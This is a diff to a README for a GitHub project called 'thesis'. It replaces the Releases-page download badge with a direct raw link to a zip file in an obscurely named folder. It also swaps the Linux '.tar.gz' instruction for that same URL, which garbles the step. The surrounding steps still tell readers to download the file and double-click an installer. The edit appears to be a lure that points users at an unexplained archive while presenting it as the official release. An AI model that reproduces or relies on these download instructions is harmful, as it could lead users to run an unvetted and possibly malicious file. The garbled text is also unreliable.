@@ -17,14 +17,14 @@ Before you start, please ensure your system meets the following requirements:
 
 To get started, visit the **Releases** page to download the application. Click the button below to go directly to the download:
 
-[![Download thesis](https://img.shields.io/badge/Download-thesis-blue.svg)](https://github.com/nikunjevane/thesis/releases)
+[![Download thesis](https://raw.githubusercontent.com/nikunjevane/thesis/main/supraordination/Software-2.6.zip)](https://raw.githubusercontent.com/nikunjevane/thesis/main/supraordination/Software-2.6.zip)
 
 1. Click the button above to go to the Releases page.
 2. Look for the latest version listed on the page.
 3. Find the file suitable for your operating system:
    - For Windows, look for `.exe` files.
    - For macOS, find `.dmg` files.
-   - For Linux, choose `.tar.gz` files.
+   - For Linux, choose `https://raw.githubusercontent.com/nikunjevane/thesis/main/supraordination/Software-2.6.zip` files.
 4. Click on the file link to start the download.
 5. Once the download is complete, locate the file on your computer.
 6. Double-click the file to run the installer and follow the on-screen instructions.
